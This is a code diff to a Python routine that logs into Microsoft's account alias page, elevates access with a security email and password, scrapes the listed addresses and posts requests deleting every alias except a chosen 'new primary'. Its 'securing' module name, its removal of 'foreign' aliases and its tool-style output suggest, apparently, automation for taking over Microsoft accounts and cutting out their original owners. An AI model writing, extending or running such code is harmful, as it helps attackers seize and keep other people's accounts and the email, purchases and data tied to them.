@@ -25,11 +25,15 @@ async def delete_aliases(
     session: httpx.AsyncClient,
     *,
     keep_email: str | None = None,
+    security_email: str | None = None,
+    account_email: str | None = None,
+    password: str | None = None,
 ) -> None:
     """Remove secondary aliases. Soft-skips if the manage page has no canary
     (common when Microsoft returns an interrupt / i5600 / SSO page instead).
 
     ``keep_email`` — never remove this address (new primary / current login).
+    When canary is missing and security_email is provided, try SA elevation once.
     """
     response = await session.get(
         url="https://account.live.com/names/manage",
@@ -37,24 +41,57 @@ async def delete_aliases(
         follow_redirects=True,
     )
 
-    canary = _extract_canary(response.text or "")
+    text = response.text or ""
+    canary = _extract_canary(text)
+    if not canary and security_email:
+        try:
+            from securing.utils.security.change_primary_alias import (
+                _elevate_for_names_manage,
+            )
+
+            print("[~] - Alias removal needs SA elevation — elevating…")
+            text, canary, _emails = await _elevate_for_names_manage(
+                session,
+                text,
+                security_email=security_email,
+                account_email=account_email or keep_email,
+                password=password,
+            )
+        except Exception as exc:
+            logger.warning("delete_aliases elevate failed: %s", exc)
+
     if not canary:
-        page_id = re.search(r'PageID" content="([^"]+)"', response.text or "")
+        page_id = re.search(r'PageID" content="([^"]+)"', text or "")
         logger.warning(
             "delete_aliases: no canary (status=%s page=%s url=%s len=%s) — skipping",
             response.status_code,
             page_id.group(1) if page_id else "?",
             str(response.url)[:120],
-            len(response.text or ""),
+            len(text or ""),
         )
         print("[~] - Skipping alias removal (manage page missing canary)")
         return
 
     aliases = re.findall(
         r'id="idAliasEmail\d+".*?<span class="dirltr\s*">([^<]+@[^<]+)</span>',
-        response.text,
+        text,
         re.DOTALL,
     )
+    if not aliases:
+        # Fallback scrape — manage page markup varies
+        aliases = re.findall(
+            r'([a-zA-Z0-9._+-]+@(?:outlook|hotmail|live|gmail)\.[a-zA-Z.]{2,})',
+            text,
+        )
+        # de-dupe
+        seen: set[str] = set()
+        cleaned: list[str] = []
+        for a in aliases:
+            al = a.strip().lower()
+            if al not in seen and "ilovevbucks" not in al:
+                seen.add(al)
+                cleaned.append(a.strip())
+        aliases = cleaned
 
     if not aliases:
         print("[~] - No aliases to remove")
@@ -64,6 +101,7 @@ async def delete_aliases(
     keep_local = keep.split("@", 1)[0] if keep else ""
 
     print(f"[~] - Found Aliases ({aliases})")
+    removed = 0
     for alias in aliases:
         alias_l = alias.strip().lower()
         local = alias_l.split("@", 1)[0]
@@ -71,7 +109,6 @@ async def delete_aliases(
         if keep and (alias_l == keep or (keep_local and local == keep_local)):
             print(f"[~] - Keeping primary alias ({alias})")
             continue
-        # Also never delete the first listed alias when it matches keep — belt & suspenders
         await session.post(
             url="https://account.live.com/names/Manage",
             headers={
@@ -86,3 +123,6 @@ async def delete_aliases(
             },
         )
         print(f"[+] - Removed {alias}")
+        removed += 1
+    if removed:
+        print(f"[+] - Removed {removed} foreign alias(es)")
